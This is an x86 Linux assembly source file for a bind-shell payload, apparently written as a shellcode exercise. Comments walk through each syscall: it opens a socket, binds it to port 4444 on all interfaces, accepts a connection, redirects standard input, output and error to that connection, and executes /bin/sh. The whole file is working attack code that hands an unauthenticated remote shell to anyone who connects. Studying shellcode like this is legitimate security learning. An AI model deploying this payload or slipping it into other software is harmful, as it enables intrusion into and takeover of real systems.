global _start

section .text
_start:
	xor edi,edi
; [ Setup the socket ]
; socketcall(int call, *args) eax 102 -> ebx, esp
; socket(int domain, int type, int protocol) -> push, push, push
; invoke system call
;
	mov eax, 102		; socketcall()
	mov ebx, 1			; SYS_SOCK = 1
	push 0 				; IPPROTO_IP = 0
	push 1 				; SOCK_STREAM = 1
	push 2				; AF_INET = 2
	mov ecx, esp
	int 0x80
; NOTE: eax contains sockfd 
;
; [ Bind to the socket ]
; store eax
; socketcall(int call, *args) eax 102 -> ebx, esp
; bind(int sockfd, struct *sockaddr, addrlen) -> push, push <struct>, push <eaxStore>
; invoke system call
;
	mov edi, eax
	push eax 			; *sockaddr INADDR_ANY = 0
	push word 0x901f	; *sockaddr PORT = 4444
	push 2				; *sockaddr AF_INET = 2	
	mov ebx, esp
	push byte 16		; push addrlen onto the stack
	push ebx			; push the pointer to the struct onto the stack
	push edi			; push sockfd onto the stack
	
	mov eax, 102		; socketcall()
	mov ebx, 2			; SYS_bind = 2
	mov ecx, esp		; point ecx to the arguments passed to the stack
	int 0x80	
	
; [ Listen on the socket ]
; socketcall(int call, *args) eax 102 -> ebx, esp
; listen(int sockfd, int backlog) push, push <eaxStore>
; invoke system call
;
	mov eax, 102
	mov ebx, 4			; SYS_LISTEN = 4
	push 0				; backlog = 0
	push edi			; sockfd
	mov ecx, esp		; TEST
	int 0x80

; [ Accept a connection on a socket ]
; socketcall(int call, *args) eax 102 -> ebx, esp
; accept(int sockfd, struct *sockaddr, addrlen) -> push, push <struct>, push <eaxStore>
; invoke system call
;
	xor eax, eax
	push eax			; addrlen = NULL
	push eax			; *sockaddr = NULL
	push edi			; sockfd
	
	mov eax, 102		; socketcall()
	mov ebx, 5			; SYS_ACCEPT
	mov ecx, esp		; stack pointer args
	int 0x80
	
; [ Duplicate file descriptors and write to socketfd ]
; #define STDIN_FILENO	0	/* Standard input */
; #define STDOUT_FILENO 1	/* Standard output */
; #define STDERR_FILENO 2	/* Standard error */
; dup2(int oldfd, newfd) eax 63 -> <eaxStore>,<register->2>
; [ Setup FD loop ]
; dup2:
;	int 0x80
;	dec <register>
;	jns dup
	mov ebx, eax
	xor ecx, ecx
	mov ecx, 2
dup2:
	mov eax, 63
	int 0x80
	dec ecx
	jns dup2

; [ Execute /bin/sh ]
; "//bin/sh"[::-1].encode('hex')
; '68732f6e69622f2f'
; 
; execve(const char *filename, push NULL, push, push, ebx->esp
;			   char *const argv[], push ebx, ecx->esp
;			   char *const envp[], push NULL, edx->esp
;) eax 11
; invoke system call
	xor eax,eax
	push eax
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	mov edx, eax
	mov ecx, eax

	mov al, 11
	int 0x80
